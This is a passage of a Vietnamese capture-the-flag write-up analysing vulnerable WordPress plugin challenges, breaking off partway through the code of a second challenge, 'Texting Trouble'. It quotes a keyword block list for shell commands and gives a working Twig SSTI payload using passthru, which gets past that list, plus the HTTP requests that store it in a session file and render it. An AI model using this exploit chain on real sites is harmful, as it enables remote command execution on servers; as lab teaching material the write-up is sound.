</span></span></code></pre></td></tr></table></div></div><p>Tên file phải không rỗng và không được nằm trong danh sách các file có phần mở rộng nguy hiểm như <code>.php</code>, <code>.htm</code>, <code>.html</code>, v.v. Điều này giúp ngăn chặn việc sử dụng các file có khả năng thực thi mã độc.</p></li><li><p><strong>Kiểm tra nội dung file:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>is_timber_template</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$fullPath</span><span class=p>))</span> <span class=o>===</span> <span class=k>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>is_valid_template</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$fullPath</span><span class=p>))</span> <span class=o>===</span> <span class=k>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>             
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Sau khi xác định rằng tên file hợp lệ, nội dung của file sẽ được đọc và kiểm tra qua hai hàm <code>is_timber_template()</code> và <code>is_valid_template()</code> để đảm bảo rằng file không chứa các đoạn mã nguy hiểm.</p></li></ul></li><li><p><strong>Hàm <code>is_timber_template()</code>:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>is_timber_template</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$pattern</span> <span class=o>=</span> <span class=s1>&#39;/({{.*?}}|{%.*?%}|{#.*?#})/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=nv>$pattern</span><span class=p>,</span> <span class=nv>$content</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Hàm này kiểm tra xem file có chứa các biểu thức liên quan đến Timber template engine (như <code>{{ }}</code>, <code>{% %}</code>, hoặc <code>{# #}</code>). Nếu file có chứa các đoạn mã này, nó được coi là một template hợp lệ để Timber có thể render.</p></li><li><p><strong>Hàm <code>is_valid_template()</code>:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>is_valid_template</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$pattern</span> <span class=o>=</span> <span class=s1>&#39;/\b(filter|system|cat|bash|bin|exec|_self|env|dump|app|sort|tac|file_excerpt|\/bin|FILENAME)\b/i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=nv>$pattern</span><span class=p>,</span> <span class=nv>$content</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Hàm này kiểm tra xem nội dung file có chứa các từ khóa nguy hiểm như <code>system</code>, <code>exec</code>, <code>cat</code>, <code>bash</code>, <code>env</code>, v.v. Đây là các từ khóa có thể liên quan đến việc thực thi lệnh hệ thống hoặc thao tác với file, vì vậy nếu chúng xuất hiện, file sẽ bị từ chối để tránh các cuộc tấn công RCE (Remote Code Execution).</p></li></ol><h3 id=cách-khai-thác-tiềm-năng>Cách khai thác tiềm năng:<a hidden class=anchor aria-hidden=true href=#cách-khai-thác-tiềm-năng>#</a></h3><p>Tuy đoạn mã đã có các cơ chế kiểm tra để ngăn chặn việc sử dụng các file nguy hiểm hoặc nội dung độc hại, nhưng có thể tận dụng nếu biết trước các tên file hợp lệ trên server. Cụ thể:</p><ul><li><p><strong>SSTI (Server-Side Template Injection):</strong> Do tham số <code>page</code> được sử dụng để render file template bằng Timber, nếu có thể đoán được tên file template hợp lệ, có thể khai thác SSTI. Tuy nhiên, do có các biện pháp kiểm tra nội dung template qua hàm <code>is_timber_template()</code> và <code>is_valid_template()</code>, việc trực tiếp thực hiện RCE bằng SSTI qua các từ khóa nguy hiểm như <code>system</code> hay <code>exec</code> là khó thực hiện.</p></li><li><p><strong>Bypass <code>validate()</code></strong>: Để vượt qua hàm <code>validate()</code>, bạn cần cung cấp giá trị <code>page</code> với một tên file chính xác, không chứa phần mở rộng bị cấm, và không chứa các từ khóa bị cấm trong nội dung.</p></li></ul><h3 id=phân-tích-tiếp-theo>Phân tích tiếp theo<a hidden class=anchor aria-hidden=true href=#phân-tích-tiếp-theo>#</a></h3><p>Trong đoạn code mà bài viết đề cập, có một chức năng lưu trữ dữ liệu vào session thông qua hàm <code>save_session()</code>. Điểm đáng chú ý là dữ liệu từ request có thể được lưu vào file session trên server thông qua hàm <code>session_start()</code>, và file này sẽ nằm trong thư mục <code>/tmp</code>, điều này có thể dẫn đến một khả năng khai thác thú vị.</p><h3 id=phân-tích-chi-tiết-đoạn-code-save_session>Phân tích chi tiết đoạn code <code>save_session()</code>:<a hidden class=anchor aria-hidden=true href=#phân-tích-chi-tiết-đoạn-code-save_session>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>save_session</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>start_session</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;session_data&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;session_data&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>stripslashes</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;session_data&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=s1>&#39;Data is saved to session.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;Some error happened.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_save_session&#39;</span><span class=p>,</span> <span class=s1>&#39;save_session&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_nopriv_save_session&#39;</span><span class=p>,</span> <span class=s1>&#39;save_session&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><ol><li><p><strong>Hàm <code>save_session()</code>:</strong></p><ul><li>Hàm này sẽ bắt đầu một session với <code>start_session()</code>.</li><li>Nếu có tham số <code>session_data</code> được gửi thông qua request, nó sẽ lưu dữ liệu đó vào biến <code>$_SESSION['session_data']</code> và phản hồi lại client thông qua JSON rằng dữ liệu đã được lưu thành công. Nếu không có tham số này, nó sẽ trả về lỗi.</li></ul></li><li><p><strong>Session file:</strong></p><ul><li>Khi hàm <code>start_session()</code> được gọi, một file session sẽ được tạo ra trong thư mục <code>/tmp</code> với tên dạng <code>sess_xxx</code>, trong đó <code>xxx</code> là session ID.</li><li>Dữ liệu được lưu trữ trong session sẽ được ghi vào file này. Điều này bao gồm cả nội dung của <code>$_SESSION['session_data']</code>, tức là giá trị của <code>$_REQUEST['session_data']</code> sẽ được ghi vào file session trong thư mục <code>/tmp</code>.</li></ul></li></ol><h3 id=khai-thác-khả-năng-lưu-ssti-vào-session-file>Khai thác khả năng lưu SSTI vào session file:<a hidden class=anchor aria-hidden=true href=#khai-thác-khả-năng-lưu-ssti-vào-session-file>#</a></h3><p>Dựa trên cơ chế xử lý này, chúng ta có thể lợi dụng để lưu một payload khai thác SSTI vào file session trong thư mục <code>/tmp</code>. Như đã phân tích ở phần trước, hàm <code>validate()</code> trong bài kiểm tra các điều kiện để quyết định xem file nào có thể được render bởi Timber. Điều quan trọng là hàm này cho phép truy cập vào các file nằm trong thư mục <code>/tmp</code>, vì Timber đã được cấu hình để tìm kiếm template ở cả thư mục <code>/tmp</code> và <code>templates</code> thông qua đoạn code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>Timber</span><span class=o>::</span><span class=nv>$dirname</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;../../../../../../../../../../../../tmp&#39;</span><span class=p>,</span> <span class=s1>&#39;templates&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Điều này có nghĩa là, nếu chúng ta lưu một payload SSTI hợp lệ vào file session, chúng ta có thể lợi dụng để Timber render file đó như một template và kích hoạt lỗ hổng SSTI.</p><h3 id=cách-khai-thác>Cách khai thác:<a hidden class=anchor aria-hidden=true href=#cách-khai-thác>#</a></h3><ol><li><p><strong>Lưu payload SSTI vào session file:</strong></p><p>Chúng ta có thể gửi một request tới action <code>save_session</code> với tham số <code>session_data</code> chứa payload SSTI.</p><p>Payload SSTI:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-twig data-lang=twig><span class=line><span class=cl><span class=cp>{{</span><span class=o>[</span><span class=s1>&#39;grep . /flag.txt&#39;</span><span class=o>]|</span><span class=nf>map</span><span class=o>(</span><span class=s1>&#39;passthru&#39;</span><span class=o>)</span><span class=cp>}}</span><span class=x>}
</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>Do ở đây hàm filter có chặn những từ khoá như <code>system</code>, <code>cat</code>, .v.v.. nên sử dụng payload trên thì 👌</p></blockquote><p>Gửi request để lưu payload này vào session:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>POST /wp-admin/admin-ajax.php?action=save_session
</span></span></span><span class=line><span class=cl><span class=err>Content-Type: application/x-www-form-urlencoded
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>session_data={{[&#39;grep . /flag.txt&#39;]|map(&#39;passthru&#39;)}}}
</span></span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Xác định tên file session:</strong></p><p>File session sẽ có tên dạng <code>sess_&lt;session_id></code>. Session ID này có thể được lấy từ cookie của trình duyệt sau khi gửi request đầu tiên hoặc bằng cách tìm session ID trực tiếp trên server (nếu có quyền truy cập).</p></li><li><p><strong>Render file session:</strong></p><ul><li>Sau khi lưu payload vào session file, chúng ta có thể thực hiện cuộc tấn công SSTI bằng cách gửi request đến endpoint với tham số <code>page</code> trỏ đến file session vừa tạo. Tên file session sẽ là <code>sess_&lt;session_id></code>.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET /wp-admin/admin-ajax.php?page=sess_&lt;session_id&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>Và đọc được flag</p></li></ol><p><img loading=lazy src=https://images.viblo.asia/4e6160e9-4933-4011-bab1-2bf9da7d8b96.png alt=image.png></p><h1 id=texting-trouble>Texting Trouble<a hidden class=anchor aria-hidden=true href=#texting-trouble>#</a></h1><p><img loading=lazy src=https://images.viblo.asia/5513ddc2-a9b1-4781-aa29-a50ae66d5085.png alt=image.png></p><p>Với challeng này, chúng ta cùng phân tích hàm <code>send_message_callback()</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=k>public</span> <span class=k>function</span> <span class=nf>send_message_callback</span><span class=p>()</span> <span class=p>{</span>             
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=nv>$error</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>                                  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=nv>$formdata</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;formdata&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>         <span class=nx>parse_str</span><span class=p>(</span><span class=nv>$formdata</span><span class=p>,</span> <span class=nv>$output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$message</span>     <span class=o>=</span> <span class=nx>sanitize_textarea_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-message&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$mess_type</span>   <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-message-type&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$mess_suffix</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-message-suffix&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$mess_attachment</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-attachment&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$jotmemkey</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;jotmemid&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$jotseckey</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;sec&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$jotmemkey</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>             <span class=k>list</span><span class=p>(</span><span class=nv>$jotgrpid</span><span class=p>,</span><span class=nv>$jotmemid</span><span class=p>)</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>,</span> <span class=nv>$jotmemkey</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>             <span class=nv>$member</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>get_member</span><span class=p>(</span><span class=nv>$jotmemid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>         <span class=p>}</span>
</span></span><span class=line><span class=cl>         <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$jotseckey</span><span class=p>)</span> <span class=o>||</span> <span class=nx>JOTAC_Plugin</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>key</span><span class=o>!==</span><span class=nv>$jotseckey</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>             <span class=c1>// Bail out
</span></span></span><span class=line><span class=cl><span class=c1></span>             <span class=k>die</span><span class=p>();</span>       
</span></span><span class=line><span class=cl>         <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$message</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>             <span class=c1>// Empty message
</span></span></span><span class=line><span class=cl><span class=c1></span>             <span class=nv>$error</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span>       
</span></span><span class=line><span class=cl>         <span class=p>}</span>   					 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=k>if</span> <span class=p>(</span><span class=nv>$error</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>               <span class=k>if</span> <span class=p>(</span><span class=nx>JOTAC_Plugin</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>currentsmsprovider</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Save message type
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=nv>$smsmessage</span> <span class=o>=</span>  <span class=nx>get_option</span><span class=p>(</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                     <span class=nv>$smsmessage</span><span class=p>[</span><span class=s1>&#39;jot-message-type&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$mess_type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Save message suffix
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=nv>$smsmessage</span><span class=p>[</span><span class=s1>&#39;jot-message-suffix&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$mess_suffix</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Save message content
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=nv>$smsmessage</span><span class=p>[</span><span class=s1>&#39;jot-message&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=nx>update_option</span><span class=p>(</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>,</span><span class=nv>$smsmessage</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Replace tags in message
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=nv>$message</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>get_replace_tags</span><span class=p>(</span><span class=nv>$message</span><span class=p>,</span><span class=nv>$member</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Append Message suffix
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$mess_suffix</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                           <span class=nv>$fullmessage</span> <span class=o>=</span> <span class=nv>$message</span> <span class=o>.</span> <span class=s2>&#34; &#34;</span> <span class=o>.</span> <span class=nv>$mess_suffix</span> <span class=p>;</span>                     
</span></span><span class=line><span class=cl>                     <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                           <span class=nv>$fullmessage</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>;</span>    
</span></span><span class=line><span class=cl>                     <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Optional attachment
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$mess_attachment</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[a-zA-Z]+:\/\//&#39;</span><span class=p>,</span> <span class=nv>$mess_attachment</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$error</span> <span class=o>=</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$additional_error</span> <span class=o>=</span> <span class=s2>&#34;Incorrect format&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$allowed_extensions</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;txt&#39;</span><span class=p>,</span><span class=s1>&#39;png&#39;</span><span class=p>,</span><span class=s1>&#39;jpg&#39;</span><span class=p>,</span><span class=s1>&#39;pdf&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nx>pathinfo</span><span class=p>(</span><span class=nv>$mess_attachment</span><span class=p>,</span> <span class=nx>PATHINFO_EXTENSION</span><span class=p>),</span> <span class=nv>$allowed_extensions</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$error</span> <span class=o>=</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$additional_error</span> <span class=o>=</span> <span class=s2>&#34;Filetype not supported&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$wp_dir</span> <span class=o>=</span> <span class=nx>wp_upload_dir</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$attachment_fp</span> <span class=o>=</span> <span class=nv>$wp_dir</span><span class=p>[</span><span class=s1>&#39;basedir&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;/attachments/&#39;</span> <span class=o>.</span> <span class=nv>$mess_attachment</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$available_files</span> <span class=o>=</span> <span class=nx>array_diff</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=nx>dirname</span><span class=p>(</span><span class=nv>$attachment_fp</span><span class=p>)),</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;..&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$existing_files</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>                            <span class=k>foreach</span> <span class=p>(</span><span class=nv>$available_files</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$existing_files</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                            <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nx>basename</span><span class=p>(</span><span class=nv>$attachment_fp</span><span class=p>),</span> <span class=nv>$existing_files</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$attachment_raw</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$attachment_fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$error</span> <span class=o>=</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$additional_error</span> <span class=o>=</span> <span class=s2>&#34;File does not exist among [&#34;</span><span class=o>.</span><span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=p>,</span> <span class=nv>$existing_files</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;]&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=p>}</span>
</span></span><span class=line><span class=cl>
